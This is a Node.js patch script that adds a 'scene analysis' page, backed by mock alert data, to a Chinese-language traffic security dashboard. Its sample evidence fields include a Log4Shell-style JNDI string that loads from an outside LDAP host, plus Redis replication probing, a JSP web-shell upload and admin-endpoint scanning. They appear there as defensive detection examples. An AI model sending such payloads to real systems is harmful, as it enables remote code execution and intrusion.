import fs from 'node:fs';

const appPath = '/home/ubuntu/cloud-traffic-security/client/src/App.vue';
const cssPath = '/home/ubuntu/cloud-traffic-security/client/src/index.css';
let app = fs.readFileSync(appPath, 'utf8');
let css = fs.readFileSync(cssPath, 'utf8');

function replaceOnce(source, find, replace, label) {
  if (!source.includes(find)) throw new Error(`未找到替换点：${label}`);
  return source.replace(find, replace);
}

app = replaceOnce(
  app,
  "type PageKey = 'overview' | 'alerts' | 'behavior' | 'intelligence' | 'trace' | 'risk' | 'assets' | 'rules' | 'warning';",
  "type PageKey = 'overview' | 'alerts' | 'scene' | 'behavior' | 'intelligence' | 'trace' | 'risk' | 'assets' | 'rules' | 'warning';",
  'PageKey 增加 scene'
);
app = replaceOnce(
  app,
  "type WarningTab = '邮件通知' | '邮件列表' | '邮件服务器配置';\n",
  "type WarningTab = '邮件通知' | '邮件列表' | '邮件服务器配置';\ntype SceneTab = '数据库行为分析' | 'WEB服务器分析' | '非常规服务分析' | '登录行为分析' | '挖矿行为分析' | '邮件安全分析';\n",
  '增加 SceneTab 类型'
);
app = replaceOnce(
  app,
  "type IconKey = PageKey | TraceTab | AssetTab | RuleTab | WarningTab | '外部攻击'",
  "type IconKey = PageKey | TraceTab | AssetTab | RuleTab | WarningTab | SceneTab | '外部攻击'",
  'IconKey 增加 SceneTab'
);
app = replaceOnce(
  app,
  "const activeWarningTab = ref<WarningTab>('邮件服务器配置');\n",
  "const activeWarningTab = ref<WarningTab>('邮件服务器配置');\nconst activeSceneTab = ref<SceneTab>('数据库行为分析');\n",
  'activeSceneTab'
);
app = replaceOnce(
  app,
  "const selectedLevel = ref('全部等级');\nconst selectedStatus = ref('全部状态');\n",
  "const selectedLevel = ref('全部等级');\nconst selectedStatus = ref('全部状态');\nconst sceneKeyword = ref('');\nconst sceneLevel = ref('全部等级');\nconst sceneStatus = ref('全部状态');\nconst selectedSceneEventId = ref('SC-DB-001');\nconst sceneDrawerOpen = ref(false);\n",
  '场景分析筛选状态'
);
app = replaceOnce(
  app,
  "      { key: 'alerts' as PageKey, label: '实时告警', icon: 'alerts' },\n      { key: 'behavior' as PageKey, label: '威胁监测', icon: 'behavior' },",
  "      { key: 'alerts' as PageKey, label: '实时告警', icon: 'alerts' },\n      { key: 'scene' as PageKey, label: '场景分析', icon: 'scene' },\n      { key: 'behavior' as PageKey, label: '威胁监测', icon: 'behavior' },",
  '导航增加场景分析一级入口'
);
app = replaceOnce(
  app,
  "overview: 'overview', alerts: 'alerts', behavior: 'behavior', intelligence: 'intelligence', trace: 'trace', risk: 'risk', assets: 'assets', rules: 'rules', warning: 'warning',",
  "overview: 'overview', alerts: 'alerts', scene: 'traffic', behavior: 'behavior', intelligence: 'intelligence', trace: 'trace', risk: 'risk', assets: 'assets', rules: 'rules', warning: 'warning',",
  'moduleIcons 增加 scene'
);
app = replaceOnce(
  app,
  "  规则配置: 'config', 规则组配置: 'group', 白名单: 'whitelist', 邮件通知: 'mail', 邮件列表: 'recipients', 邮件服务器配置: 'smtp',\n",
  "  规则配置: 'config', 规则组配置: 'group', 白名单: 'whitelist', 邮件通知: 'mail', 邮件列表: 'recipients', 邮件服务器配置: 'smtp',\n  数据库行为分析: 'database', WEB服务器分析: 'web', 非常规服务分析: 'network', 登录行为分析: 'profile', 挖矿行为分析: 'baseline', 邮件安全分析: 'mail',\n",
  'moduleIcons 增加场景子模块'
);
app = replaceOnce(
  app,
  "  alerts: { title: '实时告警', crumb: '我的位置 / 威胁分析 / 实时告警', desc: '按威胁场景、攻击类型、等级和状态筛选告警并完成处置' },\n  behavior:",
  "  alerts: { title: '实时告警', crumb: '我的位置 / 威胁分析 / 实时告警', desc: '按威胁场景、攻击类型、等级和状态筛选告警并完成处置' },\n  scene: { title: '场景分析', crumb: '我的位置 / 场景分析', desc: '围绕数据库、WEB、非常规服务、登录、挖矿和邮件场景开展流量安全研判' },\n  behavior:",
  'pageMeta 增加 scene'
);

const sceneData = String.raw`
const sceneTabs: SceneTab[] = ['数据库行为分析', 'WEB服务器分析', '非常规服务分析', '登录行为分析', '挖矿行为分析', '邮件安全分析'];

const sceneModules = [
  {
    tab: '数据库行为分析' as SceneTab,
    subtitle: '识别数据库慢查询爆发、越权访问、批量导出和异常源连接',
    queryHint: '库名 / SQL 指纹 / 账号 / 源 IP',
    stats: [
      { label: '异常 SQL 会话', value: '248', delta: '+16.2%', tone: 'blue' },
      { label: '批量导出风险', value: '31', delta: '高危 9', tone: 'red' },
      { label: '敏感库访问', value: '76', delta: '涉及 12 个库', tone: 'orange' },
      { label: '已阻断连接', value: '54', delta: '策略命中', tone: 'green' },
    ],
    trend: [28, 36, 32, 44, 58, 51, 63],
    queryItems: ['数据库实例', 'SQL 指纹', '账号', '源 IP', '访问结果'],
    rows: [
      { id: 'SC-DB-001', time: '2026-05-08 11:26:18', source: '10.18.21.45', target: 'mysql-pay-prod:3306', protocol: 'MySQL', behavior: '高频 SELECT 敏感字段', level: '高危' as Severity, status: '溯源中' as AlertStatus, owner: '支付业务组', metric: '1,284 次 / 10 分钟', evidence: 'SELECT card_no, id_no FROM pay_user WHERE update_time > ?', detail: '同一账号在短时间内访问身份证、银行卡字段，流量特征接近批量拖库。', suggestion: '临时冻结只读账号，核查数据导出工单与应用发布记录。' },
      { id: 'SC-DB-002', time: '2026-05-08 11:18:03', source: '172.20.4.18', target: 'pg-report-prod:5432', protocol: 'PostgreSQL', behavior: '跨库 JOIN 与全表扫描', level: '中危' as Severity, status: '可疑' as AlertStatus, owner: '报表平台组', metric: '慢查询 42 条', evidence: 'Seq Scan on customer_profile cost=0.00..19281.44', detail: '报表账号触发异常全表扫描，返回行数超过历史基线 5.6 倍。', suggestion: '确认报表任务窗口，必要时限制该账号跨库 JOIN 权限。' },
      { id: 'SC-DB-003', time: '2026-05-08 10:52:41', source: '198.51.100.29', target: 'redis-cache-prod:6379', protocol: 'Redis', behavior: '未授权 INFO/CONFIG 探测', level: '高危' as Severity, status: '已阻断' as AlertStatus, owner: '基础架构组', metric: '探测 18 次', evidence: 'CONFIG GET dir; INFO replication; SLAVEOF attempt', detail: '外部源尝试探测 Redis 配置并构造主从复制链路。', suggestion: '确认 Redis 访问控制列表，禁止公网访问并轮换可能暴露的口令。' },
    ],
  },
  {
    tab: 'WEB服务器分析' as SceneTab,
    subtitle: '分析 HTTP 请求、响应码、异常 URI、WebShell 上传和 WAF 绕过行为',
    queryHint: '域名 / URI / 状态码 / User-Agent',
    stats: [
      { label: '异常 URI', value: '1,426', delta: '+22.4%', tone: 'blue' },
      { label: '命令执行探测', value: '39', delta: '高危 14', tone: 'red' },
      { label: '上传风险', value: '17', delta: 'WebShell 3', tone: 'orange' },
      { label: 'WAF 已拦截', value: '812', delta: '57.0%', tone: 'green' },
    ],
    trend: [96, 122, 104, 148, 176, 161, 190],
    queryItems: ['域名', 'URI', '状态码', '请求方法', 'User-Agent'],
    rows: [
      { id: 'SC-WEB-001', time: '2026-05-08 11:30:24', source: '203.0.113.61', target: 'portal.sgcc.local', protocol: 'HTTPS', behavior: '命令执行参数注入', level: '高危' as Severity, status: '已阻断' as AlertStatus, owner: '门户系统组', metric: 'POST 27 次', evidence: '/api/report/export?tpl=\${jndi:ldap://203.0.113.61/a}', detail: '请求参数包含命令执行与远程加载特征，命中高危规则。', suggestion: '确认应用框架版本，检查同源 IP 近 7 天历史请求并加入封禁策略。' },
      { id: 'SC-WEB-002', time: '2026-05-08 11:12:08', source: '36.21.0.49', target: 'oa-web-prod', protocol: 'HTTP', behavior: '异常文件上传', level: '中危' as Severity, status: '可疑' as AlertStatus, owner: '协同办公组', metric: '上传 4 个 JSP', evidence: 'Content-Type=multipart/form-data filename=shell.jsp', detail: '上传文件扩展名和 MIME 类型不一致，响应体包含脚本执行回显。', suggestion: '隔离上传目录，复核最近 24 小时新增文件与访问日志。' },
      { id: 'SC-WEB-003', time: '2026-05-08 10:47:19', source: '10.8.72.16', target: 'api-gateway-prod', protocol: 'HTTPS', behavior: '401/403 暴增', level: '低危' as Severity, status: '未成功' as AlertStatus, owner: '网关平台组', metric: '403 占比 41%', evidence: 'GET /admin /actuator/env /debug/vars', detail: '同一源对管理端点进行字典化探测，未发现成功访问。', suggestion: '维持拦截策略，增加管理端点访问白名单。' },
    ],
  },
  {
    tab: '非常规服务分析' as SceneTab,
    subtitle: '发现未知端口、非常规协议、异常监听和绕行访问路径',
    queryHint: '端口 / 协议 / 资产 / 会话方向',
    stats: [
      { label: '未知服务暴露', value: '63', delta: '+11', tone: 'orange' },
      { label: '高危端口访问', value: '27', delta: '公网 8', tone: 'red' },
      { label: '异常监听', value: '15', delta: '新增 5', tone: 'blue' },
      { label: '已收敛策略', value: '34', delta: '自动关闭', tone: 'green' },
    ],
    trend: [18, 22, 26, 21, 34, 39, 44],
    queryItems: ['非常规端口', '协议', '资产类型', '方向', '策略结果'],
    rows: [
      { id: 'SC-SVC-001', time: '2026-05-08 11:20:16', source: '198.51.100.88', target: 'ecs-pay-02:58000', protocol: 'TCP/58000', behavior: '公网访问非常规管理端口', level: '高危' as Severity, status: '已阻断' as AlertStatus, owner: '支付业务组', metric: '连接 96 次', evidence: 'SYN burst to tcp/58000, banner=debug-console', detail: '生产主机暴露调试端口，来自公网源持续建立连接。', suggestion: '关闭调试端口，核查进程启动参数并收敛安全组入方向。' },
      { id: 'SC-SVC-002', time: '2026-05-08 10:59:33', source: '10.12.8.31', target: 'dmz-file-01:445', protocol: 'SMB', behavior: '跨域 SMB 横向访问', level: '中危' as Severity, status: '溯源中' as AlertStatus, owner: '文件服务组', metric: '会话 213 条', evidence: 'TREE_CONNECT IPC$; ADMIN$ access denied', detail: '办公域资产访问 DMZ 文件服务器管理共享，偏离历史访问基线。', suggestion: '确认运维工单，限制跨域 SMB 并检查源主机登录账号。' },
      { id: 'SC-SVC-003', time: '2026-05-08 10:38:11', source: '172.16.22.17', target: 'container-node-07:2375', protocol: 'Docker API', behavior: '未加密容器 API 访问', level: '高危' as Severity, status: '可疑' as AlertStatus, owner: '容器平台组', metric: 'API 12 次', evidence: 'GET /containers/json over tcp/2375', detail: 'Docker API 端口未启用 TLS，存在容器枚举风险。', suggestion: '关闭 2375 暴露，改用 TLS 认证端口并轮换节点证书。' },
    ],
  },
  {
    tab: '登录行为分析' as SceneTab,
    subtitle: '聚合 SSH、RDP、VPN、堡垒机和应用登录的异常来源与结果',
    queryHint: '账号 / 登录源 / 资产 / 认证结果',
    stats: [
      { label: '异常登录', value: '386', delta: '+19.7%', tone: 'blue' },
      { label: '暴力破解', value: '74', delta: '高危 21', tone: 'red' },
      { label: '异地登录', value: '28', delta: '跨省 9', tone: 'orange' },
      { label: '已锁定账号', value: '16', delta: '自动处置', tone: 'green' },
    ],
    trend: [42, 58, 51, 66, 84, 77, 91],
    queryItems: ['账号', '源 IP', '登录协议', '登录结果', '资产'],
    rows: [
      { id: 'SC-LOGIN-001', time: '2026-05-08 11:33:09', source: '45.77.12.40', target: 'vpn-gateway', protocol: 'VPN', behavior: '同账号多地失败登录', level: '高危' as Severity, status: '已阻断' as AlertStatus, owner: '身份平台组', metric: '失败 132 次', evidence: 'user=ops_admin result=failed geo=境外代理', detail: '特权账号在 8 分钟内从多个境外代理发起认证失败。', suggestion: '强制重置账号口令，检查 MFA 状态并封禁代理网段。' },
      { id: 'SC-LOGIN-002', time: '2026-05-08 11:04:27', source: '10.10.8.19', target: 'ecs-report-01', protocol: 'SSH', behavior: '非运维窗口 root 登录', level: '中危' as Severity, status: '可疑' as AlertStatus, owner: '报表平台组', metric: '成功 1 次', evidence: 'sshd accepted publickey root from 10.10.8.19', detail: 'root 登录发生在非授权变更窗口，来源为办公网跳板机。', suggestion: '核对变更单，保留 shell 历史并建议禁用 root 直登。' },
      { id: 'SC-LOGIN-003', time: '2026-05-08 10:41:58', source: '172.18.4.66', target: 'bastion-prod', protocol: '堡垒机', behavior: '短时间切换多资产', level: '低危' as Severity, status: '已处理' as AlertStatus, owner: '运维中心', metric: '资产 18 台', evidence: 'session_count=18 avg_duration=21s', detail: '运维账号短时间打开多个会话，已确认属于巡检脚本。', suggestion: '沉淀为巡检基线，保留最小权限授权。' },
    ],
  },
  {
    tab: '挖矿行为分析' as SceneTab,
    subtitle: '识别矿池连接、异常算力、挖矿进程和资源占用突增',
    queryHint: '矿池域名 / 进程 / 钱包 / 主机',
    stats: [
      { label: '矿池连接', value: '49', delta: '+8', tone: 'red' },
      { label: '疑似挖矿主机', value: '12', delta: '容器 5', tone: 'orange' },
      { label: 'CPU 异常峰值', value: '91%', delta: '平均 64%', tone: 'blue' },
      { label: '已隔离实例', value: '7', delta: '自动编排', tone: 'green' },
    ],
    trend: [7, 12, 9, 18, 25, 22, 31],
    queryItems: ['矿池域名', '钱包地址', '进程名', '资产', '处置状态'],
    rows: [
      { id: 'SC-MINE-001', time: '2026-05-08 11:35:22', source: 'ecs-ai-train-04', target: 'pool.minexmr.example:443', protocol: 'TLS', behavior: '疑似矿池长连接', level: '高危' as Severity, status: '已阻断' as AlertStatus, owner: 'AI 平台组', metric: '持续 42 分钟', evidence: 'SNI=pool.minexmr.example ja3=abf7... cpu=96%', detail: '训练主机与矿池域名建立长连接，同时 CPU 使用率异常升高。', suggestion: '隔离主机，排查 /tmp 与定时任务中的可执行文件。' },
      { id: 'SC-MINE-002', time: '2026-05-08 11:01:13', source: 'pod/data-etl-7c9', target: '198.51.100.201:3333', protocol: 'Stratum', behavior: 'Stratum 协议特征', level: '高危' as Severity, status: '溯源中' as AlertStatus, owner: '数据平台组', metric: '提交 share 18 次', evidence: 'mining.subscribe mining.authorize', detail: '容器出站流量符合 Stratum 挖矿协议，镜像层出现未知二进制。', suggestion: '保留容器快照，回滚镜像并检查 CI/CD 凭据。' },
      { id: 'SC-MINE-003', time: '2026-05-08 10:26:49', source: 'ecs-test-09', target: 'dns-query', protocol: 'DNS', behavior: '矿池域名解析', level: '中危' as Severity, status: '可疑' as AlertStatus, owner: '测试环境组', metric: '解析 33 次', evidence: 'xmr.* domain family, TTL short', detail: '测试主机反复解析矿池相关域名，但未观察到成功连接。', suggestion: '清理测试主机临时脚本并加入 DNS sinkhole。' },
    ],
  },
  {
    tab: '邮件安全分析' as SceneTab,
    subtitle: '检测钓鱼邮件、异常 SMTP、附件投递、账号盗用和外发泄露',
    queryHint: '发件人 / 收件人 / 主题 / 附件哈希',
    stats: [
      { label: '钓鱼邮件', value: '168', delta: '+24.1%', tone: 'red' },
      { label: '异常外发', value: '43', delta: '敏感附件 11', tone: 'orange' },
      { label: '恶意附件', value: '29', delta: '沙箱命中', tone: 'blue' },
      { label: '已隔离邮件', value: '126', delta: '75.0%', tone: 'green' },
    ],
    trend: [21, 35, 30, 44, 52, 48, 66],
    queryItems: ['发件人', '收件人', '主题', '附件哈希', '投递结果'],
    rows: [
      { id: 'SC-MAIL-001', time: '2026-05-08 11:28:46', source: 'notice@pay-sec.example', target: 'finance-group@corp.local', protocol: 'SMTP', behavior: '仿冒通知钓鱼邮件', level: '高危' as Severity, status: '已阻断' as AlertStatus, owner: '财务共享中心', metric: '收件人 42', evidence: 'SPF fail, lookalike domain, attachment=invoice.scr', detail: '发件域名与真实安全通知域高度相似，附件扩展名伪装。', suggestion: '隔离邮件，提醒财务组并将仿冒域加入拦截策略。' },
      { id: 'SC-MAIL-002', time: '2026-05-08 10:55:20', source: 'user-ops@corp.local', target: 'external-mail@example.net', protocol: 'SMTP', behavior: '敏感附件异常外发', level: '中危' as Severity, status: '可疑' as AlertStatus, owner: '运维中心', metric: '附件 86MB', evidence: 'filename=账号清单.xlsx dlp=credential-pattern', detail: '内部账号向外部邮箱发送包含疑似账号字段的附件。', suggestion: '联系账号所有人确认外发目的，必要时撤回邮件并锁定账号。' },
      { id: 'SC-MAIL-003', time: '2026-05-08 10:22:15', source: 'hr@corp.local', target: 'all-staff@corp.local', protocol: 'SMTP', behavior: '群发链接重定向异常', level: '低危' as Severity, status: '已处理' as AlertStatus, owner: '人力资源部', metric: '点击 12 次', evidence: 'URL redirect chain length=4 final=unknown', detail: '邮件中短链存在多级跳转，已确认来自第三方问卷平台。', suggestion: '将可信问卷平台加入低风险名单并保留 URL 重写。' },
    ],
  },
];
`;
app = replaceOnce(app, "const behaviorStats = [\n", sceneData + "\nconst behaviorStats = [\n", '插入场景分析数据');

app = replaceOnce(
  app,
  "const filteredBehaviorEvents = computed(() => behaviorEvents.filter((item) => activeBehaviorLayer.value === '全部' || item.layer === activeBehaviorLayer.value));\nconst selectedBehaviorEvent = computed(() => behaviorEvents.find((item) => item.id === selectedBehaviorEventId.value) || behaviorEvents[0]);\n",
  String.raw`const selectedSceneModule = computed(() => sceneModules.find((item) => item.tab === activeSceneTab.value) || sceneModules[0]);
const filteredSceneRows = computed(() => selectedSceneModule.value.rows.filter((item) => {
  const keyword = sceneKeyword.value.trim().toLowerCase();
  const matchLevel = sceneLevel.value === '全部等级' || item.level === sceneLevel.value;
  const matchStatus = sceneStatus.value === '全部状态' || item.status === sceneStatus.value;
  const haystack = (item.id + ' ' + item.source + ' ' + item.target + ' ' + item.protocol + ' ' + item.behavior + ' ' + item.evidence + ' ' + item.owner).toLowerCase();
  return matchLevel && matchStatus && (!keyword || haystack.includes(keyword));
}));
const selectedSceneEvent = computed(() => selectedSceneModule.value.rows.find((item) => item.id === selectedSceneEventId.value) || filteredSceneRows.value[0] || selectedSceneModule.value.rows[0]);
const sceneTotalEvents = computed(() => selectedSceneModule.value.rows.reduce((sum, item) => sum + Number.parseInt(item.metric.replace(/[^0-9]/g, '') || '1', 10), 0));
const filteredBehaviorEvents = computed(() => behaviorEvents.filter((item) => activeBehaviorLayer.value === '全部' || item.layer === activeBehaviorLayer.value));
const selectedBehaviorEvent = computed(() => behaviorEvents.find((item) => item.id === selectedBehaviorEventId.value) || behaviorEvents[0]);
`,
  '插入场景分析计算属性'
);

app = replaceOnce(
  app,
  "    behavior: '已刷新运行时威胁事件、攻击向量与敏感文件访问证据',\n",
  "    scene: '已刷新场景分析统计、查询条件与事件列表',\n    behavior: '已刷新运行时威胁事件、攻击向量与敏感文件访问证据',\n",
  'refresh action scene'
);
app = replaceOnce(
  app,
  "  behaviorDrawerOpen.value = false;\n",
  "  behaviorDrawerOpen.value = false;\n  sceneDrawerOpen.value = false;\n",
  'setPage 关闭场景详情'
);

const sceneFunctions = String.raw`
function switchSceneTab(tab: SceneTab) {
  activeSceneTab.value = tab;
  const module = sceneModules.find((item) => item.tab === tab) || sceneModules[0];
  selectedSceneEventId.value = module.rows[0].id;
  sceneDrawerOpen.value = false;
  showToast('已切换到' + tab + '场景，统计项、查询项和列表已同步更新');
}

function openSceneEvent(id: string) {
  selectedSceneEventId.value = id;
  sceneDrawerOpen.value = true;
  showToast('已打开场景分析事件 ' + id + ' 的流量证据详情');
}

function resetSceneFilter() {
  sceneKeyword.value = '';
  sceneLevel.value = '全部等级';
  sceneStatus.value = '全部状态';
  showToast('已重置场景分析查询条件');
}

function linkSceneToAlert() {
  const row = selectedSceneEvent.value;
  alertKeyword.value = row.source;
  selectedLevel.value = row.level;
  setPage('alerts');
  showToast('已按 ' + row.source + ' 联动查询实时告警');
}

`;
app = replaceOnce(app, "function goTrace(id: string) {\n", sceneFunctions + "function goTrace(id: string) {\n", '插入场景分析交互函数');

const sceneTemplate = String.raw`
      <section v-if="activePage === 'scene'" class="page-stack scene-analysis-page">
        <div class="scene-hero panel">
          <div class="scene-hero-copy">
            <span class="soc-kicker"><AppIcon name="traffic" size="16" /> Traffic Scenario Analytics</span>
            <h2>场景分析</h2>
            <p>围绕数据库、WEB、非常规服务、登录、挖矿与邮件六类高频流量安全场景，形成“统计—查询—列表—详情研判”的分析闭环。</p>
          </div>
          <div class="scene-hero-metrics">
            <article><b>{{ selectedSceneModule.rows.length }}</b><span>当前列表项</span></article>
            <article><b>{{ sceneTotalEvents }}</b><span>聚合命中量</span></article>
            <article><b>{{ selectedSceneModule.queryItems.length }}</b><span>查询维度</span></article>
          </div>
        </div>

        <div class="scene-tabs" role="tablist" aria-label="场景分析子模块">
          <button v-for="tab in sceneTabs" :key="tab" :class="['scene-tab', { active: activeSceneTab === tab }]" @click="switchSceneTab(tab)">
            <span><AppIcon :name="iconFor(tab)" :label="tab" /></span><strong>{{ tab }}</strong>
          </button>
        </div>

        <div class="scene-stat-grid">
          <article v-for="stat in selectedSceneModule.stats" :key="stat.label" :data-tone="stat.tone" class="scene-stat-card">
            <span>{{ stat.label }}</span><strong>{{ stat.value }}</strong><em>{{ stat.delta }}</em>
          </article>
          <article class="scene-trend-card">
            <div><span>近 7 天趋势</span><strong>{{ selectedSceneModule.tab }}</strong></div>
            <svg viewBox="0 0 300 90"><polyline :points="sparkline(selectedSceneModule.trend, 300, 90)" class="line cyan-line" /></svg>
            <div class="scene-axis"><span>7天前</span><span>今日</span></div>
          </article>
        </div>

        <div class="scene-query-card panel">
          <div>
            <h3>{{ selectedSceneModule.tab }}</h3>
            <p>{{ selectedSceneModule.subtitle }}</p>
          </div>
          <div class="scene-query-fields">
            <span v-for="field in selectedSceneModule.queryItems" :key="field">{{ field }}</span>
          </div>
          <div class="scene-query-controls">
            <input v-model="sceneKeyword" :placeholder="selectedSceneModule.queryHint" />
            <select v-model="sceneLevel"><option>全部等级</option><option>高危</option><option>中危</option><option>低危</option></select>
            <select v-model="sceneStatus"><option>全部状态</option><option>成功</option><option>可疑</option><option>未成功</option><option>已处理</option><option>已阻断</option><option>溯源中</option></select>
            <button class="blue-button" @click="showToast('已执行场景分析查询')">查询</button>
            <button class="white-button" @click="resetSceneFilter">重置</button>
          </div>
        </div>

        <div class="table-card scene-table-card">
          <table class="data-table scene-data-table">
            <thead><tr><th>事件编号</th><th>时间</th><th>源对象</th><th>目标对象</th><th>协议/端口</th><th>行为类型</th><th>等级</th><th>状态</th><th>统计项</th><th>操作</th></tr></thead>
            <tbody>
              <tr v-for="item in filteredSceneRows" :key="item.id" @click="openSceneEvent(item.id)">
                <td><strong>{{ item.id }}</strong><small>{{ item.owner }}</small></td>
                <td>{{ item.time }}</td>
                <td>{{ item.source }}</td>
                <td>{{ item.target }}</td>
                <td>{{ item.protocol }}</td>
                <td>{{ item.behavior }}</td>
                <td><span :class="levelClass(item.level)">{{ item.level }}</span></td>
                <td><span :class="statusClass(item.status)">{{ item.status }}</span></td>
                <td>{{ item.metric }}</td>
                <td class="ops"><button @click.stop="openSceneEvent(item.id)">详情</button><button @click.stop="showToast('已生成该场景事件的处置工单')">处置</button></td>
              </tr>
            </tbody>
          </table>
          <div class="pagination"><span>共 {{ filteredSceneRows.length }} 条</span><div><button>上一页</button><b class="active">1</b><button>下一页</button></div></div>
        </div>
      </section>

`;
app = replaceOnce(app, "<section v-if=\"activePage === 'behavior'\"", sceneTemplate + "<section v-if=\"activePage === 'behavior'\"", '插入场景分析页面模板');

const drawerTemplate = String.raw`
      <aside v-if="sceneDrawerOpen" class="detail-drawer scene-detail-drawer">
        <div class="drawer-mask" @click="sceneDrawerOpen = false"></div>
        <section class="drawer-panel">
          <header><div><span class="soc-kicker">{{ activeSceneTab }}</span><h3>{{ selectedSceneEvent.id }} · {{ selectedSceneEvent.behavior }}</h3><p>{{ selectedSceneEvent.time }} / {{ selectedSceneEvent.owner }}</p></div><button @click="sceneDrawerOpen = false">×</button></header>
          <div class="drawer-grid">
            <article><span>源对象</span><strong>{{ selectedSceneEvent.source }}</strong></article>
            <article><span>目标对象</span><strong>{{ selectedSceneEvent.target }}</strong></article>
            <article><span>协议/端口</span><strong>{{ selectedSceneEvent.protocol }}</strong></article>
            <article><span>统计项</span><strong>{{ selectedSceneEvent.metric }}</strong></article>
          </div>
          <div class="evidence-box"><h4>详情信息</h4><p>{{ selectedSceneEvent.detail }}</p><code>{{ selectedSceneEvent.evidence }}</code></div>
          <div class="evidence-box"><h4>处置建议</h4><p>{{ selectedSceneEvent.suggestion }}</p></div>
          <div class="drawer-actions"><button class="blue-button" @click="linkSceneToAlert">联动实时告警</button><button class="white-button" @click="goTrace(alerts[0].id)">进入溯源分析</button><button class="white-button" @click="showToast('已导出场景分析详情证据')">导出证据</button></div>
        </section>
      </aside>

`;
app = replaceOnce(app, "<aside v-if=\"behaviorDrawerOpen\"", drawerTemplate + "<aside v-if=\"behaviorDrawerOpen\"", '插入场景分析详情抽屉');

const cssBlock = String.raw`

/* 场景分析一级模块：Neo-Enterprise Minimalism，构建“统计—查询—列表—详情研判”的流量安全分析闭环。 */
.scene-analysis-page { gap: 18px; }
.scene-hero { display: grid; grid-template-columns: minmax(0, 1.4fr) minmax(320px, .8fr); align-items: center; gap: 28px; padding: 24px 28px; background: linear-gradient(135deg, #f8fbff 0%, #edf6ff 48%, #f7fbff 100%); border: 1px solid #dbe8f7; box-shadow: 0 18px 45px rgba(15, 76, 129, .08); }
.scene-hero-copy h2 { margin: 8px 0 10px; font-size: 30px; color: #0f172a; letter-spacing: -.03em; }
.scene-hero-copy p { max-width: 760px; margin: 0; color: #506176; line-height: 1.8; }
.scene-hero-metrics { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
.scene-hero-metrics article { padding: 18px; border-radius: 3px; background: rgba(255,255,255,.86); border: 1px solid #dbeafe; box-shadow: inset 0 0 0 1px rgba(255,255,255,.65); }
.scene-hero-metrics b { display: block; font-size: 30px; color: #1d4ed8; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
.scene-hero-metrics span { color: #64748b; font-size: 12px; }
.scene-tabs { display: grid; grid-template-columns: repeat(6, minmax(0, 1fr)); gap: 10px; }
.scene-tab { min-height: 78px; border: 1px solid #dbe5f3; background: #fff; color: #42526b; padding: 14px 12px; text-align: left; display: flex; flex-direction: column; gap: 9px; transition: .2s ease; box-shadow: 0 10px 24px rgba(15, 23, 42, .04); }
.scene-tab span { width: 30px; height: 30px; display: grid; place-items: center; color: #1d4ed8; background: #eff6ff; border-radius: 2px; }
.scene-tab strong { font-size: 13px; }
.scene-tab:hover, .scene-tab.active { border-color: #2563eb; color: #0f3b7c; transform: translateY(-1px); box-shadow: 0 16px 34px rgba(37, 99, 235, .12); }
.scene-stat-grid { display: grid; grid-template-columns: repeat(4, minmax(150px, 1fr)) minmax(280px, 1.2fr); gap: 14px; }
.scene-stat-card, .scene-trend-card { background: #fff; border: 1px solid #dbe5f3; padding: 18px; box-shadow: 0 12px 28px rgba(15, 23, 42, .05); }
.scene-stat-card span { display: block; color: #64748b; font-size: 12px; }
.scene-stat-card strong { display: block; margin: 10px 0 8px; font-size: 28px; color: #0f172a; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
.scene-stat-card em { font-style: normal; font-size: 12px; color: #2563eb; }
.scene-stat-card[data-tone="red"] em, .scene-stat-card[data-tone="red"] strong { color: #dc2626; }
.scene-stat-card[data-tone="orange"] em, .scene-stat-card[data-tone="orange"] strong { color: #ea580c; }
.scene-stat-card[data-tone="green"] em, .scene-stat-card[data-tone="green"] strong { color: #059669; }
.scene-trend-card { display: grid; grid-template-rows: auto 1fr auto; gap: 8px; }
.scene-trend-card div:first-child { display: flex; justify-content: space-between; gap: 14px; color: #64748b; font-size: 12px; }
.scene-trend-card strong { color: #0f172a; font-size: 13px; }
.scene-trend-card svg { width: 100%; height: 86px; background: linear-gradient(180deg, rgba(239,246,255,.7), rgba(255,255,255,0)); }
.scene-axis { display: flex; justify-content: space-between; color: #94a3b8; font-size: 11px; }
.scene-query-card { display: grid; grid-template-columns: minmax(260px, .8fr) minmax(240px, .7fr) minmax(360px, 1.25fr); gap: 18px; align-items: center; padding: 20px; }
.scene-query-card h3 { margin: 0 0 6px; font-size: 18px; color: #0f172a; }
.scene-query-card p { margin: 0; color: #64748b; line-height: 1.6; }
.scene-query-fields { display: flex; flex-wrap: wrap; gap: 8px; }
.scene-query-fields span { padding: 7px 10px; background: #f1f5f9; border: 1px solid #dbe5f3; color: #475569; font-size: 12px; }
.scene-query-controls { display: grid; grid-template-columns: minmax(180px, 1fr) 120px 120px auto auto; gap: 8px; }
.scene-query-controls input, .scene-query-controls select { height: 36px; border: 1px solid #cbd5e1; padding: 0 10px; background: #fff; color: #1f2937; }
.scene-data-table tr { cursor: pointer; }
.scene-data-table small { display: block; color: #94a3b8; margin-top: 4px; }
.scene-detail-drawer .drawer-panel { max-width: 720px; }
.drawer-actions { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 16px; }

@media (max-width: 1280px) {
  .scene-tabs { grid-template-columns: repeat(3, minmax(0, 1fr)); }
  .scene-stat-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); }
  .scene-trend-card { grid-column: 1 / -1; }
  .scene-query-card { grid-template-columns: 1fr; }
}
@media (max-width: 760px) {
  .scene-hero { grid-template-columns: 1fr; }
  .scene-hero-metrics, .scene-tabs, .scene-stat-grid, .scene-query-controls { grid-template-columns: 1fr; }
}
`;
if (!css.includes('场景分析一级模块')) css += cssBlock;

fs.writeFileSync(appPath, app);
fs.writeFileSync(cssPath, css);
console.log('场景分析一级模块已写入 App.vue 与 index.css');
